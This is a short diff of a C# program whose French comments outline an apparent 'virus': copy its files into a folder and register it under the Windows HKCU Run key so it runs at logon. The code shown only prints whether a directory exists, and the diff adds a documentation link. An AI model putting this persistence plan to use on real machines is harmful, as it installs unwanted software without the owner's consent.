@@ -26,8 +26,14 @@ class Program{
                 3 - Si l'étape 1 et validé et que il a du cree le dossier car il ne l'été pas alors on vérifi si les fichier du virus sont télécharger et si non on les mov dans le repertoir sinon si oui on les mov dans le repertoir
                 4 - avant de run le virus il faut vérifier si dans la cle de registre : Ordinateur\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run il y a pas deja le virus si non alor on le rajoute et on dit dans quelle repertoir il ce trouve
             */
+            /*
+            Cree un dossier  documentation
+            https://learn.microsoft.com/fr-fr/dotnet/api/system.io.directory.createdirectory?view=net-8.0
+            */
+
             if(isDirectory == true){
                 Console.WriteLine("Le fichier existe");
+
             }else{
                 Console.WriteLine("Error");
             }
